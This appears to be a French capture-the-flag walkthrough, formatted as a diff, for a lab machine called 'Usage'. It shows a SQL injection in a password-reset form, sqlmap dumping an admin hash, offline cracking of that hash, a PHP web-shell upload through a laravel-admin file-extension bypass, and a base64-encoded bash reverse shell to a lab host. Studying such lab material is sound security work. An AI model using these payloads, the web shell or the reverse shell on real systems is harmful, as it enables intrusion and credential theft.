@@ -1,0 +1,196 @@
+IP :10.10.11.18
+
+HTTP server : http://usage.ht
+
+/registration
+test
+test@usage.htb
+test123456
+
+
+faille sql découverte sur le champ email dans /forgot-password
+
+test ' or 1=1;-- -
+
+POST /forget-password HTTP/1.1
+Host: usage.htb
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 77
+Origin: http://usage.htb
+Connection: keep-alive
+Referer: http://usage.htb/forget-password
+Cookie: XSRF-TOKEN=eyJpdiI6IjBUWFJhZVZtTWZFM1AyWjdTd1BZVUE9PSIsInZhbHVlIjoiM2xOZlpidG40cmdRblRla21mOFRVQ1pLSllzZUZvMm11OWJzZDR0VHM4aERJcEJaNzN6dzlNODRuY3BLYlJyQUxwWXlRUXdSc0hGYkZMVlV0T3ZWWm04NEFGMXpEZDNGdWRIdmVWRUMzSzZjS2VYOVNjVERubFVyYlB4aUd2YXMiLCJtYWMiOiJmN2M3OWRkMWFhMmMwYmM5ODE4OGZmZTAzMWNlNzExNDZjZDJkYzUzNzFjYWI4NTRhYzU5NDAyZDM5ZTUyNzIxIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InllbDlYWGhPckRNVjRhckE1ekd6a1E9PSIsInZhbHVlIjoiblZNMm5jc1U4TXF5QmxlNFplTlJnaHV2azVHdlZQcERURE5yK0NGNmg4V1YranRjOFNNUlIweUpmTHNuTEVCOXFhUGJwa0V0TDA5azZNaEdncG9PUlh4YXArNFJ5RmllMHJtR3lGb2FhTzRDOGZMQ1dtUUF4c0VEeGdjR0hsMmIiLCJtYWMiOiI2NjA0NjI4YmRiNjg1ODBhMDk3YzQxZTM3MDhhZjJjODQ3M2VhMDVjMTk5NDFiMWIzNDBiM2Y1MTM1NzA0YTQwIiwidGFnIjoiIn0%3D
+Upgrade-Insecure-Requests: 1
+
+_token=UyChHjZFtgnLF4upaMPjKpLnzKYM4yI44b9xr7sb&email=test
+
+
+on récupère la requête POST et on la met dans un fichier pour tester la vulnérabilité avec sqlmap
+
+sqmap -r reset.req -p email --batch
+
+si on a pas de résultat probant, on augmente le niveau de risque 
+
+sqmap -r reset.req -p email --batch --level 3
+
+
+
+On peut voir que le paramètre 'email' est vulnérable à l'injection sql
+
+POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 448 HTTP(s) requests:
+---
+Parameter: email (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: _token=UyChHjZFtgnLF4upaMPjKpLnzKYM4yI44b9xr7sb&email=test' AND 8744=(SELECT (CASE WHEN (8744=8744) THEN 8744 ELSE (SELECT 1152 UNION SELECT 1568) END))-- uFBA
+
+    Type: time-based blind
+    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
+    Payload: _token=UyChHjZFtgnLF4upaMPjKpLnzKYM4yI44b9xr7sb&email=test' AND 4437=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- HQou
+
+---
+
+
+on va donc afficher les bases de données 
+
+sqlmap -r reset.req -p email --batch --level 3 --dbs
+
+On peut affichier les resultat plus vite en ajoutant + de threads (process)
+sqlmap -r reset.req -p email --batch --level 3 --dbs --threads
+
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+
+[17:32:27] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 143 times
+[17:32:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'
+
+[*] ending @ 17:32:27 /2024-08-17/
+
+on va faire afficher les tables de `usage_blog`
+
+sqlmap -r reset.req -p email --batch --level 3 -D usage_blog --tables --threads=10
+
+Database: usage_blog
+[15 tables]
++------------------------+
+| admin_menu             |
+| admin_operation_log    |
+| admin_permissions      |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+
+[17:40:28] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 761 times
+[17:40:28] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'
+
+[*] ending @ 17:40:28 /2024-08-17/
+
+PArès énumération, on a 15 tables dans la base `usage_blog`, la tables `admin_users` semble la plus intérressante, on va pouvoir récupérer les creds de l'administrateur et donc accéder au tableau de bord de l'admin
+
+On va donc faire un dump de la table `admin_users`
+
+sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
+
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2024-08-17 17:41:35 | aNxfauZUMIqwO0OiYwPvzk3RJs5qKU8tUBPlWzH1bj9kqfKefUmKHnyDUbrX |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+
+[18:04:30] [INFO] table 'usage_blog.admin_users' dumped to CSV file '/root/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv'
+[18:04:30] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 865 times
+[18:04:30] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/usage.htb'
+
+[*] ending @ 18:04:30 /2024-08-17/
+
+On a une entrée avec comme nom `Administrator`
+Le mot de passe est hashé, on va donc utiliser la méthode passe-the-hash pour trouver le mot de passe en clair. Pour cela, on va utiliser johntheripper pour du bruteforce offline
+
+on met le hash dans un fichier texte
+
+john hash --wordlist=`fzf-wordlists`
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+whatever1        (?)
+1g 0:00:00:13 DONE (2024-08-17 18:18) 0.07513g/s 122.6p/s 122.6c/s 122.6C/s alexis1..punkrock
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+le mot de passe a été trouvé, on va donc pouvoir se connecter sur le tableau de bord du site
+
+admin:whatever1
+
+
+sur le dashboard, on a quelques infos
+
+PHP Version: PHP/8.1.2-1ubuntu2.14
+
+Laravel version 	10.18.0
+
+Uname 	Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64
+
+Server 	nginx/1.18.0
+
+
+On a un autre hash dans les logs 
+
+$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\/WQMKnAQ7k2HJ
+
+
+Des dépendances
+
+php 	^8.1
+encore/laravel-admin 	1.8.18
+guzzlehttp/guzzle 	^7.2
+laravel/framework 	^10.10
+laravel/sanctum 	^3.2
+laravel/tinker 	^2.8
+symfony/filesystem 	^6.3s
+
+
+
+
+
+Foothold
+
+La version de encore/laravel est vulnérable à une faille d'éxecution par code arbitraire, grace à une bypass de l'extension du fichier en modifiant la requête de post avant de l'envoyer, on change le nom du fichier de 'shell.jpg' en 'shell.jpg.php'
+POC: <?php system($_GET["melo"]); ?>
+
++ d'infos : https://flyd.uk/post/cve-2023-24249/
+
+on peut donc créer un reverse shell en bash
+
+Ce même reverse shell on va l'encoder en base 64 et l'encoder en url pour éviter les erreurs inutiles
+
+echo+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjIvNDQ0NCAwPiYx+|+base64+-d+|+bash
+
+on a juste à lancer le listener avec d'envoyer le reverse shell et c'est bon on a ccès à la machine
+
+L'utilisateur de la machine se nomme `dash`
